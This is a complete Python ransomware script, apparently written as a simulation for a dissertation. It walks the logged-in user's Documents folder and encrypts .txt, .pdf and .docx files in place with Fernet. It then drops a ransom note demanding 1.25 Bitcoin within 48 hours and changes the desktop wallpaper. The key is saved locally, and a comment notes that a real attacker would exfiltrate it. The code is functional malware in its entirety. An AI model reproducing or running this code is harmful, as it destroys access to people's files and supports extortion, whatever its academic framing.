import os
import ctypes
import win32con
from cryptography.fernet import Fernet

# === DYNAMIC PATHS ===
current_dir = os.getcwd()
KEY_FILE = os.path.join(current_dir, "encryption_key.txt")
RANSOM_NOTE = os.path.join(current_dir, "READ_ME.txt")
WALLPAPER_PATH = os.path.join(current_dir, "ransom_wallpaper.bmp")

# Automatically target the logged-in user's Documents folder
TARGET_DIR = os.path.join(os.environ["USERPROFILE"], "Documents")

# === ENCRYPTION SETUP ===
key = Fernet.generate_key()
cipher = Fernet(key)

# Save encryption key (attacker would exfiltrate in real attack)
with open(KEY_FILE, "wb") as f:
    f.write(key)

# === ENCRYPT TARGET FILES ===
def encrypt_files(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith((".txt", ".pdf", ".docx")):
                full_path = os.path.join(root, file)
                try:
                    with open(full_path, "rb") as f:
                        data = f.read()
                    encrypted = cipher.encrypt(data)
                    with open(full_path, "wb") as f:
                        f.write(encrypted)
                    print(f"[+] Encrypted: {full_path}")
                except Exception as e:
                    print(f"[!] Failed to encrypt {full_path}: {e}")

# === DROP RANSOM NOTE ===
def drop_ransom_note():
    message = (
        ">>> YOUR FILES HAVE BEEN ENCRYPTED <<<\n\n"
        "Send 1.25 Bitcoin to: 3FzN9KZ89syZcLpXsADissertation4YXrAGgDD5t8a7Ks\n"
        "After payment, contact dissertation.test@gmail.com with proof.\n"
        "Failure to comply within 48 hours will result in permanent data loss."
    )
    with open(RANSOM_NOTE, "w") as f:
        f.write(message)

# === CHANGE DESKTOP WALLPAPER ===
def change_wallpaper(image_path):
    abs_path = os.path.abspath(image_path)
    ctypes.windll.user32.SystemParametersInfoW(
        win32con.SPI_SETDESKWALLPAPER, 0, abs_path, 3
    )

# === MAIN EXECUTION ===
if __name__ == "__main__":
    encrypt_files(TARGET_DIR)
    drop_ransom_note()
    change_wallpaper(WALLPAPER_PATH)
    print("✅ Ransomware simulation complete.")
